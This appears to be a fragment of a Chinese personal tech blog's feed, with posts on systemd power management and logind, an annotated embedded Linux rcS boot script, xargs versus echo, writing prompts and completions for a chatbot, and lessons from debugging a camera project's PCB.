如何处理电源管理，命令如下表所示：</p><h5 id="表-3，systemd-电源管理命令"><a href="#表-3，systemd-电源管理命令" class="headerlink" title="表 3，systemd 电源管理命令"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E8%A1%A8-3%EF%BC%8Csystemd-%E7%94%B5%E6%BA%90%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4" title="表 3，systemd 电源管理命令"></a>表 3，systemd 电源管理命令</h5><table><thead><tr><th>命令</th><th>操作</th></tr></thead><tbody><tr><td>systemctl reboot</td><td>重启机器</td></tr><tr><td>systemctl poweroff</td><td>关机</td></tr><tr><td>systemctl suspend</td><td>待机</td></tr><tr><td>systemctl hibernate</td><td>休眠</td></tr><tr><td>systemctl hybrid-sleep</td><td>混合休眠模式（同时休眠到硬盘并待机）</td></tr></tbody></table><p>关机不是每个登录用户在任何情况下都可以执行的，一般只有管理员才可以关机。正常情况下系统不应该允许 SSH 远程登录的用户执行关机命令。否则其他用户正在工作，一个用户把系统关了就不好了。为了解决这个问题，传统的 Linux 系统使用 ConsoleKit 跟踪用户登录情况，并决定是否赋予其关机的权限。现在 ConsoleKit 已经被 systemd 的 logind 所替代。</p><p>logind 不是 pid-1 的 init 进程。它的作用和 UpStart 的 session init 类似，但功能要丰富很多，它能够管理几乎所有用户会话(session)相关的事情。logind 不仅是 ConsoleKit 的替代，它可以：</p><ul><li>维护，跟踪会话和用户登录情况。如上所述，为了决定关机命令是否可行，系统需要了解当前用户登录情况，如果用户从 SSH 登录，不允许其执行关机命令；如果普通用户从本地登录，且该用户是系统中的唯一会话，则允许其执行关机命令；这些判断都需要 logind 维护所有的用户会话和登录情况。</li><li>Logind 也负责统计用户会话是否长时间没有操作，可以执行休眠&#x2F;关机等相应操作。</li><li>为用户会话的所有进程创建 CGroup。这不仅方便统计所有用户会话的相关进程，也可以实现会话级别的系统资源控制。</li><li>负责电源管理的组合键处理，比如用户按下电源键，将系统切换至睡眠状态。</li><li>多席位(multi-seat) 管理。如今的电脑，即便一台笔记本电脑，也完全可以提供多人同时使用的计算能力。多席位就是一台电脑主机管理多个外设，比如两个屏幕和两个鼠标&#x2F;键盘。席位一使用屏幕 1 和键盘 1；席位二使用屏幕 2 和键盘 2，但他们都共享一台主机。用户会话可以自由在多个席位之间切换。或者当插入新的键盘，屏幕等物理外设时，自动启动 gdm 用户登录界面等。所有这些都是多席位管理的内容。ConsoleKit 始终没有实现这个功能，systemd 的 logind 能够支持多席位。</li></ul><p>以上描述的这些管理功能仅仅是 systemd 的部分功能，除此之外，systemd 还负责系统其他的管理配置，比如配置网络，Locale 管理，管理系统内核模块加载等，完整地描述它们已经超出了本人的能力。</p><h2 id="systemd-小结"><a href="#systemd-小结" class="headerlink" title="systemd 小结"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#systemd-%E5%B0%8F%E7%BB%93" title="systemd 小结"></a>systemd 小结</h2><p>在不才作者看来，作为系统初始化系统，systemd 的最大特点有两个：</p><ul><li>令人惊奇的激进的并发启动能力，极大地提高了系统启动速度；</li><li>用 CGroup 统计跟踪子进程，干净可靠。</li></ul><p>此外，和其前任不同的地方在于，systemd 已经不仅仅是一个初始化系统了。</p><p>Systemd 出色地替代了 sysvinit 的所有功能，但它并未就此自满。因为 init 进程是系统所有进程的父进程这样的特殊性，systemd 非常适合提供曾经由其他服务提供的功能，比如定时任务 (以前由 crond 完成) ；会话管理 (以前由 ConsoleKit&#x2F;PolKit 等管理) 。仅仅从本文皮毛一样的介绍来看，Systemd 已经管得很多了，可它还在不断发展。它将逐渐成为一个多功能的系统环境，能够处理非常多的系统管理任务，有人甚至将它看作一个操作系统。</p><p>好的一点是，这非常有助于标准化 Linux 的管理！从前，不同的 Linux 发行版各行其事，使用不同方法管理系统，从来也不会互相妥协。比如如何将系统进入休眠状态，不同的系统有不同的解决方案，即便是同一个 Linux 系统，也存在不同的方法，比如一个有趣的讨论：<a href="http://askubuntu.com/questions/1792/how-can-i-suspend-hibernate-from-command-line">如何让 ubuntu 系</a><a href="http://askubuntu.com/questions/1792/how-can-i-suspend-hibernate-from-command-line">统休眠</a>，可以使用底层的&#x2F;sys&#x2F;power&#x2F;state 接口，也可以使用诸如 pm-utility 等高层接口。存在这么多种不同的方法做一件事情对像我这样的普通用户而言可不是件有趣的事情。systemd 提供统一的电源管理命令接口，这件事情的意义就类似全世界的人都说统一的语言，我们再也不需要学习外语了，多么美好！</p><p>如果所有的 Linux 发行版都采纳了 systemd，那么系统管理任务便可以很大程度上实现标准化。此外 systemd 有个很棒的承诺：接口保持稳定，不会再轻易改动。对于软件开发人员来说，这是多么体贴又让人感动的承诺啊！</p><p><a href="https://www.ibm.com/developerworks/cn/linux/1407_liuming_init3/index.html?ca=drs-">本文转载自：</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-sysvinit/">原文一</a></li><li><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-UpStart/">原文二</a></li><li><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#toc-heading-22">原文三</a></li><li><a href="https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html">阮一峰的网络日志——Systmed基础篇</a></li><li><a href="https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html">阮一峰的网络日志——Systmed实战篇</a></li><li><a href="https://linux.cn/article-6888-1.html">Linux.cn的关于Systmed的文章</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rcS文件的分析</title>
    <link href="/2024/05/28/rcS%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/"/>
    <url>/2024/05/28/rcS%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>记录一下 <code>rcS</code> 文件的分析。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux操作系统下的 <code>/etc/init.d/rcS</code> 文件在 <code>inittab</code> 文件中本解析调用，用于配置Linux系统。</p><p>但是，在新的 Ubuntu 操作系统中是已经找不到这个文件了，因为是 Ubuntu 使用 <code>systemd</code> 取代了 <code>init</code> 作为系统初始化程序。</p><p><code>systemd</code> 是一个系统和服务管理器，它使用单元文件（通常位于 <code>/lib/systemd/system/</code> 和 <code>/etc/systemd/system/</code> 目录中）来配置和管理系统服务。</p><p>在 <code>systemd</code> 中，启动过程和服务管理是通过目标（targets）来控制的，这些目标可以看作是运行水平（runlevels）的替代品。例如，<code>default.target</code> 通常是图形界面或多用户环境的启动目标，而 <code>rescue.target</code> 和 <code>emergency.target</code> 分别对应于救援模式和紧急模式。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#! /bin/sh    #指定系统使用的shell</span><br><br><span class="hljs-comment">#初始化环境变量PATH，操作系统执行程序默认到PATH指定的目录下寻找该程序</span><br>PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:  <br><br>runlevel=S        <span class="hljs-comment">#设置系统运行级别为S，即单用户模式，只有一个控制台终端，供“root”帐号做系统维护。</span><br>prevlevel=N<br><br><span class="hljs-built_in">umask</span> 022                           <span class="hljs-comment">#指定当前用户在创建文件时的默认权限</span><br><span class="hljs-built_in">export</span> PATH runlevel prevlevel      <span class="hljs-comment">#导出环境变量</span><br> <br><span class="hljs-built_in">trap</span> <span class="hljs-string">&quot;:&quot;</span> INT QUIT TSTP              <span class="hljs-comment">#捕捉INT、QUIT、TSTP信号</span><br>/bin/hostname bname                 <span class="hljs-comment">#设置机器名字为bname</span><br><br><span class="hljs-comment">#挂载文件系统，-t指明文件系统的类型，-n只是单纯的mount，而不会去写/etc/mtab文件。</span><br><span class="hljs-comment">#否则，如果/etc在一个只读文件系统上写的话将引发错误。</span><br>/bin/mount -n -t proc none /proc<br>/bin/mount -n -t sysfs none /sys<br>/bin/mount -n -t usbfs none /proc/bus/usb<br>/bin/mount -t ramfs none /dev<br><br><span class="hljs-comment">#调用mdev管理程序动态的创建插拔设备。kernel在每次设备出现变动时调用/sbin/mdev来处理对应的信息,</span><br><span class="hljs-comment">#进而mdev操作/dev目录下的设备,进行添加或删除。 </span><br><span class="hljs-built_in">echo</span> /sbin/mdev &amp;gt; /proc/sys/kernel/hotplug<br>/sbin/mdev -s  <span class="hljs-comment">#开启mdev，之后可调用mdev创建设备文件 </span><br>/bin/hotplug   <span class="hljs-comment">#设置内核的hotplug handler为mdev，由mdev接受来自内核的消息并作出相应的回应，比如挂载U盘等。 </span><br><br><span class="hljs-comment"># 挂载/etc/fstab文件中指定的文件系统 </span><br><span class="hljs-built_in">mkdir</span> -p /dev/pts <br><span class="hljs-built_in">mkdir</span> -p /dev/shm <br>/bin/mount -n -t devpts none /dev/pts -o mode=0622 <br>/bin/mount -n -t tmpfs tmpfs /dev/shm <br>/bin/mount -n -t ramfs none /tmp <br>/bin/mount -n -t ramfs none /var <br><br><span class="hljs-built_in">mkdir</span> -p /var/empty <br><span class="hljs-built_in">mkdir</span> -p /var/log <br><span class="hljs-built_in">mkdir</span> -p /var/lock <br><span class="hljs-built_in">mkdir</span> -p /var/run <br><span class="hljs-built_in">mkdir</span> -p /var/tmp <br><br>/sbin/hwclock -s -f /dev/rtc <span class="hljs-comment">#从硬件RTC取得时间 </span><br>syslogd                      <span class="hljs-comment">#记录系统或应用程序产生的各种信息，并把信息写到日志中 </span><br><br>/etc/rc.d/init.d/netd start <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; &quot;</span> &amp;gt; /dev/tty1 <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Starting networking...&quot;</span> &amp;gt; /dev/tty1 <br><span class="hljs-built_in">mkdir</span> /mnt/disk <br>mount -t yaffs2 /dev/mtdblock3 /mnt/disk <span class="hljs-comment">#挂载存储设备 </span><br><span class="hljs-built_in">echo</span> V &amp;gt;/dev/watchdog                 <span class="hljs-comment">#关闭看门狗 </span><br>/sbin/ifconfig lo 127.0.0.1              <span class="hljs-comment">#设置IP地址 </span><br>insmod /lib/modules/s3c2416_gpio.ko      <span class="hljs-comment">#加载驱动程序 </span><br>/bin/sleep 2 dmesg -n 1                  <span class="hljs-comment">#显示开机信息 </span><br><span class="hljs-built_in">exec</span> /usr/etc/rc.local                   <span class="hljs-comment">#转去执行rc.local文件中内容</span><br></code></pre></td></tr></table></figure><p>**上面的文件中 <code>&amp;gt;</code> 表示 <code>&gt;</code></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/linfeng-learning/p/9285541.html">https://www.cnblogs.com/linfeng-learning/p/9285541.html</a></li><li><a href="https://fuzhii.com/2014/07/11/rcS/">https://fuzhii.com/2014/07/11/rcS/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xarg是echo的反函数</title>
    <link href="/2024/05/27/xarg%E6%98%AFecho%E7%9A%84%E5%8F%8D%E5%87%BD%E6%95%B0/"/>
    <url>/2024/05/27/xarg%E6%98%AFecho%E7%9A%84%E5%8F%8D%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>如何立即 xarg 命令</p><span id="more"></span><h1 id="xarg是echo的反函数"><a href="#xarg是echo的反函数" class="headerlink" title="xarg是echo的反函数"></a>xarg是echo的反函数</h1><p><code>xarg</code> 命令是 <code>echo</code> 命令的反函数，原因在于：</p><ul><li><code>echo</code> 命令是将命令的参数转化为 stdin</li><li><code>xarg</code> 命令是将 stdin 转化为命令的参数</li></ul><p>举个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> | xargs <span class="hljs-built_in">echo</span> | <span class="hljs-variable">$CMD</span> <span class="hljs-comment">#等同于echo | $CMD。</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$DATA</span> | xargs <span class="hljs-variable">$CMD</span> <span class="hljs-comment">#等同于$CMD $DATA。</span><br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://dhashe.com/xargs-is-the-inverse-function-of-echo.html">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>bash</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用自己独特的大模型</title>
    <link href="/2024/05/25/%E4%BD%BF%E7%94%A8%E8%87%AA%E5%B7%B1%E7%8B%AC%E7%89%B9%E7%9A%84%E5%A4%A7%E6%A8%A1%E5%9E%8B/"/>
    <url>/2024/05/25/%E4%BD%BF%E7%94%A8%E8%87%AA%E5%B7%B1%E7%8B%AC%E7%89%B9%E7%9A%84%E5%A4%A7%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>如何使用大模型平台开发出自定义的问答机器人？</p><span id="more"></span><h1 id="如何编写-Prompt-和-completion"><a href="#如何编写-Prompt-和-completion" class="headerlink" title="如何编写 Prompt 和 completion"></a>如何编写 Prompt 和 completion</h1><p>什么是 Prompt 和 completion？</p><p>Prompt 是指输入文本，completion 是指模型根据 Prompt 生成的文本。</p><p><strong>Prompt 又可以称之为 提示词 。提示词工程师现在出现在人们的视野中</strong></p><p>你给模型提供一个提示词，它会按照你的提示词生成内容。在大语言模型领域，好的 prompt 可以帮助你显著提高模型的生成效果。如果你要有文本生成的场景，学习结构化的 prompt 是必须的。</p><p>可以通过一个 json 文件来定义 Prompt 和 completion。</p><p>下面有一个示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;??##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 您好，请问您有什么问题需要咨询呢?我很乐意为您解答end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;你好##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 亲，您好，非常高兴为您服务，有什么可以为您效劳的呢?end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;在吗?##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 亲，您好!在的，有什么可以帮您的呢?end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;有人?##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 您好，您请讲end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;客服呢?##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 您好，请问您有什么问题需要咨询呢?end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hello##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 节日快乐，很高兴为您服务end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hey##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 您好，欢迎光临xiadmin.com. 有什么可以为您效劳的呢?end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hi##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 亲，在的，有什么可以帮您的呢?end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dd##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 亲，在的，非常高兴为您服务，有什么可以帮您的呢？end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;滴滴##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 您好，欢迎光临xiadmin.com，我将竭诚为您服务。end&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;老板，你好##q&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot; 您好，我是xiadmin.com客服，很高兴为您服务，请问有什么我能为您效劳的?end&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># Role: 营养师和烹饪专家</span><br><span class="hljs-section"># Background: 用户希望设计一顿营养均衡的晚餐，需要根据就餐人的地域背景和口味偏好来定制食谱。</span><br><span class="hljs-section"># Profile: 你是一位专业的营养师，同时也是一名烹饪专家，擅长根据个人口味和营养需求设计食谱。</span><br><span class="hljs-section"># Skills: 营养学知识、烹饪技巧、食材搭配、热量计算。</span><br><span class="hljs-section"># Goals: 设计一份既满足就餐人口味又营养均衡的晚餐食谱，包括前菜、主菜、配菜、酒水，并提供所需食材、做法、营养和热量信息。</span><br><span class="hljs-section"># Constrains: 食谱需要考虑营养均衡，适合晚餐食用，热量控制在合理范围内。</span><br><span class="hljs-section"># OutputFormat: 文本说明，包括各道菜的名称、所需食材、做法、营养和热量信息。</span><br><span class="hljs-section"># Workflow:</span><br><span class="hljs-bullet">  1.</span> 确定就餐人数<br><span class="hljs-bullet">  2.</span> 确定他们的地域背景和口味偏好。<br><span class="hljs-bullet">  2.</span> 根据这些信息设计食谱，确保营养均衡。<br><span class="hljs-bullet">  3.</span> 用 markdown 表格列出每道菜的菜名、所需食材、做法、营养和热量信息。<br><span class="hljs-section"># Examples:</span><br>前菜：凯撒沙拉<br>食材：罗马生菜、面包丁、帕尔马干酪、凯撒沙拉酱<br>做法：混合生菜和面包丁，撒上干酪，淋上沙拉酱。<br>营养：富含维他命A和C，低热量。<br>热量：约300卡路里<br><br>  主菜：香煎牛排配时蔬<br>  食材：牛排、橄榄油、各种时令蔬菜、海盐、黑胡椒<br>  做法：用橄榄油煎牛排至喜欢的熟度，搭配蒸煮的时蔬。<br>  营养：高蛋白，搭配蔬菜提供纤维素。<br>  热量：约500卡路里<br><br>  配菜：蒜蓉烤面包<br>  食材：法棍面包、大蒜、黄油<br>  做法：将大蒜和黄油涂抹在面包片上，烤至金黄。<br>  营养：提供能量，适量脂肪。<br>  热量：约200卡路里<br><br>  酒水：长相思干白葡萄酒<br>  信息：清爽口感，适合搭配牛排和沙拉。<br>  营养：低热量，含有抗氧化剂。<br>  热量：约125卡路里<br><span class="hljs-section"># Initialization: 欢迎来到定制晚餐食谱服务！为了更好地为大家设计一份特别的晚餐食谱，我需要了解一些信息：1. 一共有多少人就餐？大家来自哪个国家或地区？ 2. 他们喜欢什么样的口味？比如：喜欢辛辣、酸甜、咸鲜、清淡等。 3. 他们是否有任何特定的过敏食物或偏好，比如素食、无麸质、低脂等？</span><br></code></pre></td></tr></table></figure><p>从上面的示例可以看出，Prompt 就是告诉 AI 你希望的一个答案的模板。</p><p>可以知道，所谓的 Prompt 就是用于的输入文本，而 completion 就是模型根据 Prompt 生成的文本。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.xiadmin.com/40013">https://www.xiadmin.com/40013</a></li><li><a href="https://help.aliyun.com/document_detail/2589889.html?spm=5176.28197581.0.0.6d6a29a4x9pN7n">阿里云文档</a></li><li><a href="https://openai.xiniushu.com/docs/guides/completion">Openai文档</a></li><li><a href="https://learningprompt.wiki/zh-Hans/docs">学习Prompt</a></li><li><a href="https://github.com/PlexPt/awesome-chatgpt-prompts-zh?tab=readme-ov-file">如何使用ChatGPT</a></li><li><a href="https://mp.weixin.qq.com/s/CzS32jnwcn5Al6MiNKlTtw">Prompt的设计</a></li><li><a href="https://www.waytoagi.com/prompts">现成的Prompt</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Ai</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记项目中的PCB设计遇到的问题</title>
    <link href="/2024/05/24/%E8%AE%B0%E9%A1%B9%E7%9B%AE%E4%B8%AD%E7%9A%84PCB%E8%AE%BE%E8%AE%A1%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2024/05/24/%E8%AE%B0%E9%A1%B9%E7%9B%AE%E4%B8%AD%E7%9A%84PCB%E8%AE%BE%E8%AE%A1%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>对照相机这个项目中的 PCB 设计，记录一下遇到的问题和解决方法。</p><span id="more"></span><h1 id=""><a href="#" class="headerlink" title=""></a></h1><ol><li>第一次设计比较复杂的 pcb 板，没有经验。没有注意<strong>线宽</strong>的问题，导致电流的传输可能有点问题。</li><li>在绘制 pcb板 的时候需要大量的放置过孔，放置这些过孔可以在布线的同时放置好过孔的位置，避免后期布线时出现问题。同时放置这些过孔的作用有：<ol><li>利于散热</li><li>提高电流传输能力，尤其是同样一块覆铜，如果加了过孔，流过的电流将会大大增强。在信号旁边放置主要是起到一种滤除杂波的干扰</li><li>降低阻抗</li></ol></li></ol><h1 id="问题记载"><a href="#问题记载" class="headerlink" title="问题记载"></a>问题记载</h1><ol><li>由于稳压、降压模块的使用问题加之没有使用好led灯、测试点等检测方法，导致电路板的电源上有一些问题，使用万用表进行测量之后发现没有电流，并且整个 pcb板 没有任何反应。</li><li>关于程序下载的问题，这个问题具体表现为计算机无法正常下载到主控中。</li></ol><h1 id="问题的发现"><a href="#问题的发现" class="headerlink" title="问题的发现"></a>问题的发现</h1><h2 id="第一个问题——电源"><a href="#第一个问题——电源" class="headerlink" title="第一个问题——电源"></a>第一个问题——电源</h2><p>上面我提高了关于通电之后整个 pcb板 都没有反应。所以我使用万用表、移动电源进行检测。并且通过通电之后发现主控芯片的<strong>发热</strong>，知道了主控芯片焊接时候的短路，<strong>需要注意，直接使用万用表的蜂鸣器档来测试主控芯片的引脚是否有短路的现象时，有时是测不出来的，这是由于芯片的引脚上由于焊接时产生的助焊剂起到了一种隔离的作用，所以有时候会导致万用表测量不稳定、</strong></p><h2 id="第二个问题——程序下载的问题"><a href="#第二个问题——程序下载的问题" class="headerlink" title="第二个问题——程序下载的问题"></a>第二个问题——程序下载的问题</h2><p>使用 Keil5 进行程序下载的时候，计算机无法识别到主控芯片，导致程序无法下载到主控中。</p><h1 id="问题的解决"><a href="#问题的解决" class="headerlink" title="问题的解决"></a>问题的解决</h1><h2 id="第一个问题——电源的解决"><a href="#第一个问题——电源的解决" class="headerlink" title="第一个问题——电源的解决"></a>第一个问题——电源的解决</h2><p>通过使用<strong>万用表</strong>、<strong>移动电源的使用</strong>，我们知道了出现问题的地方——由于稳压、降压模块使用出现了问题，导致在 pcb板 上检测出的电流非常小，所以我直接舍弃了这些模块，直接飞线接上一个 3.3V 的电源。</p><h2 id="第二个问题——程序下载的问题-1"><a href="#第二个问题——程序下载的问题-1" class="headerlink" title="第二个问题——程序下载的问题"></a>第二个问题——程序下载的问题</h2><h1 id="问题的启示"><a href="#问题的启示" class="headerlink" title="问题的启示"></a>问题的启示</h1><h2 id="第一个问题——电源的启示"><a href="#第一个问题——电源的启示" class="headerlink" title="第一个问题——电源的启示"></a>第一个问题——电源的启示</h2><p>根据我遇到的这个问题时我的解决方法，现在对于这些方法进行总结：</p><ol><li>由于遇到了关于电源的问题，并且我在处理这个问题的时候并不好处理。由于前期测试点的缺失、相关的 led灯 的缺失，使得我无法直观的了解到 pcb板 的电气参数。所以，在设计原理图、绘制 pcb板 的时候就需要做好这些事。</li><li>在设计原理图的时候，需要注意到<strong>线宽</strong>的问题，线宽太窄会导致电流的传输不稳定，线宽太宽会导致过孔的增加，导致散热不足。所以在设计原理图的时候，需要注意线宽的设置。</li><li>直接将 GND 通过测试点的方式直接引出来，当然其实很多元器件的金属外壳也是 GND。</li><li>在放置 led灯 的时候最好不要将 led灯 直接串联在电路的主线上，而是通过引出一个支线，将其并联在一起。</li><li>首先，对于 pcb板 进行焊接之前需要对于整块 pcb板 需要有一个短路的测试，确认好这块 pcb板 的主要电源线是完好的。</li><li>在关键的芯片、电路附近放置好测试点，或者是放置好 